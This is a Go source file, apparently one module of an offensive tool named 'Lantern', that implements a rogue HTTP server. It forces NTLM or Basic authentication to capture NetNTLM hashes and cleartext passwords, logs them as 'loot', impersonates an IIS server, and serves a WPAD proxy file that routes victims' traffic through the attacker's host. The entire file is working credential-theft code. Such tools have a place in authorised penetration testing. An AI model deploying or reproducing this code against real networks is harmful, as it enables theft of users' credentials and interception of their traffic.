// Package http implements a rogue HTTP server that forces NTLM (or Basic)
// authentication and captures the resulting NetNTLM hash or cleartext
// credentials. It also serves a WPAD proxy auto-config file to coerce clients
// into proxying — and therefore authenticating — through Lantern.
package http

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"net/textproto"
	"strconv"
	"strings"
	"time"

	"lantern/internal/core"
	"lantern/internal/ntlm"
)

const (
	ServiceName = "http"
	DefaultPort = 80
	readTimeout = 30 * time.Second
)

type Module struct {
	server *core.TCPServer
	Logger *core.Logger

	// Basic serves a Basic auth challenge instead of NTLM when no credentials
	// have been offered yet. NTLM captures hashes; Basic captures cleartext.
	Basic bool
	// ForceWPADAuth requires authentication before handing out the WPAD file.
	ForceWPADAuth bool

	// cfg is captured at start so WPAD answers can resolve the proxy IP.
	cfg core.Config
}

func New(logger *core.Logger) *Module {
	m := &Module{Logger: logger}
	m.server = &core.TCPServer{
		Service: "HTTP",
		Address: "0.0.0.0",
		Port:    DefaultPort,
		Logger:  logger,
		Handler: m.handle,
	}
	return m
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return true }
func (m *Module) HasPoisoner() bool { return false }

func (m *Module) StartPoisoner(context.Context, core.Config) error {
	return fmt.Errorf("HTTP poisoning is not supported")
}

func (m *Module) StartListener(ctx context.Context, cfg core.Config) error {
	m.cfg = cfg
	m.server.Logger = m.Logger
	return m.server.Start(ctx, cfg)
}

func (m *Module) Stop() { m.server.Stop() }

type request struct {
	method string
	path   string
	header textproto.MIMEHeader
}

func (m *Module) handle(ctx context.Context, conn net.Conn) {
	client := core.ClientIP(conn)
	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)

	for {
		core.SetDeadline(ctx, conn, readTimeout)
		req, err := readRequest(tp)
		if err != nil {
			return
		}
		// Drain any request body so the connection stays usable.
		if cl := req.header.Get("Content-Length"); cl != "" {
			if n, err := strconv.Atoi(cl); err == nil && n > 0 {
				_, _ = reader.Discard(n)
			}
		}
		keepAlive := m.respond(conn, client, req)
		if !keepAlive {
			return
		}
	}
}

func readRequest(tp *textproto.Reader) (request, error) {
	var req request
	line, err := tp.ReadLine()
	if err != nil {
		return req, err
	}
	parts := strings.SplitN(line, " ", 3)
	if len(parts) < 2 {
		return req, fmt.Errorf("malformed request line %q", line)
	}
	req.method = parts[0]
	req.path = parts[1]
	req.header, err = tp.ReadMIMEHeader()
	if err != nil {
		return req, err
	}
	return req, nil
}

// respond writes the appropriate answer and reports whether the connection
// should be kept open (needed to complete the NTLM Type 1 -> 3 handshake).
func (m *Module) respond(conn net.Conn, client string, req request) bool {
	// WPAD proxy auto-config: serve without auth unless ForceWPADAuth is set.
	if isWPAD(req.path) && !m.ForceWPADAuth {
		m.serveWPAD(conn, client)
		return false
	}

	auth := req.header.Get("Authorization")
	switch {
	case strings.HasPrefix(auth, "NTLM "), strings.HasPrefix(auth, "Negotiate "):
		scheme := strings.Fields(auth)[0]
		token := strings.TrimSpace(auth[len(scheme):])
		return m.handleNTLM(conn, client, scheme, token)
	case strings.HasPrefix(auth, "Basic "):
		m.handleBasic(client, strings.TrimSpace(auth[len("Basic"):]))
		writeOK(conn)
		return true
	default:
		m.sendChallenge(conn, client)
		return true
	}
}

func (m *Module) handleNTLM(conn net.Conn, client, scheme, token string) bool {
	raw, err := base64.StdEncoding.DecodeString(token)
	if err != nil {
		m.sendChallenge(conn, client)
		return true
	}
	msgType, _, ok := ntlm.MessageType(raw)
	if !ok {
		m.sendChallenge(conn, client)
		return true
	}

	switch msgType {
	case 1:
		flags, _ := ntlm.Type1Flags(raw)
		challenge := ntlm.BuildType2(flags, ntlm.DefaultChallenge)
		m.packet("NTLMSSP", "Type 1 from %s, sending Type 2 challenge", client)
		writeNTLMChallenge(conn, scheme, challenge)
		return true
	case 3:
		id, _ := ntlm.ParseType3(raw, ntlm.DefaultChallenge)
		m.captureNTLM(client, id)
		writeOK(conn)
		return false
	default:
		m.sendChallenge(conn, client)
		return true
	}
}

func (m *Module) handleBasic(client, token string) {
	raw, err := base64.StdEncoding.DecodeString(token)
	if err != nil {
		return
	}
	user, pass, _ := strings.Cut(string(raw), ":")
	if m.Logger == nil {
		return
	}
	if user == "" {
		user = "<not provided>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[HTTP] Basic credentials from %s", client),
		"[HTTP] Username : %s\n[HTTP] Password : %q\n[HTTP] Hash     : %s:%s",
		user, pass, user, pass)
}

func (m *Module) captureNTLM(client string, id ntlm.Identity) {
	if m.Logger == nil {
		return
	}
	hostname := id.Workstation
	if hostname == "" {
		hostname = "<not provided>"
	}
	hash := id.Hash
	if hash == "" {
		hash = "<not captured>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[HTTP] NetNTLMv%d hash from %s", id.Version, client),
		"[HTTP] Hostname : %s\n[HTTP] Username : %s\n[HTTP] Hash     : %s",
		hostname, id.Display(), hash)
}

func (m *Module) sendChallenge(conn net.Conn, client string) {
	if m.Basic {
		m.packet("HTTP", "Sending Basic authentication request to %s", client)
		writeResponse(conn, "401 Unauthorized",
			[]string{"WWW-Authenticate: Basic realm=\"Authentication Required\""},
			defaultBody)
		return
	}
	m.packet("HTTP", "Sending NTLM authentication request to %s", client)
	writeResponse(conn, "401 Unauthorized",
		[]string{"WWW-Authenticate: Negotiate", "WWW-Authenticate: NTLM"},
		defaultBody)
}

func (m *Module) serveWPAD(conn net.Conn, client string) {
	ip := "127.0.0.1"
	if resolved, err := m.cfg.ResponseIPv4(); err == nil {
		ip = resolved.String()
	}
	script := fmt.Sprintf("function FindProxyForURL(url, host){return 'PROXY %s:3141; DIRECT';}", ip)
	m.packet("WPAD", "Served WPAD proxy config to %s (proxy %s:3141)", client, ip)
	writeResponse(conn, "200 OK",
		[]string{"Content-Type: application/x-ns-proxy-autoconfig"},
		script)
}

func isWPAD(path string) bool {
	path = strings.ToLower(path)
	return strings.Contains(path, "wpad.dat") || strings.HasSuffix(path, ".pac")
}

const defaultBody = "<html><head><title>401 Unauthorized</title></head><body><h2>401 - Unauthorized</h2></body></html>"

func writeNTLMChallenge(conn net.Conn, scheme string, challenge []byte) {
	header := "WWW-Authenticate: " + scheme + " " + base64.StdEncoding.EncodeToString(challenge)
	writeResponse(conn, "401 Unauthorized", []string{header}, defaultBody)
}

func writeOK(conn net.Conn) {
	writeResponse(conn, "200 OK", nil, "<html><body><h2>Authenticated</h2></body></html>")
}

func writeResponse(conn net.Conn, status string, headers []string, body string) {
	var b strings.Builder
	b.WriteString("HTTP/1.1 " + status + "\r\n")
	b.WriteString("Server: Microsoft-IIS/10.0\r\n")
	b.WriteString("Date: " + time.Now().UTC().Format(time.RFC1123) + "\r\n")
	b.WriteString("Content-Type: text/html\r\n")
	for _, h := range headers {
		b.WriteString(h + "\r\n")
	}
	b.WriteString("Content-Length: " + strconv.Itoa(len(body)) + "\r\n")
	b.WriteString("Connection: keep-alive\r\n")
	b.WriteString("\r\n")
	b.WriteString(body)
	_, _ = conn.Write([]byte(b.String()))
}

func (m *Module) packet(packetType, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Packet(ServiceName, packetType, format, args...)
	}
}
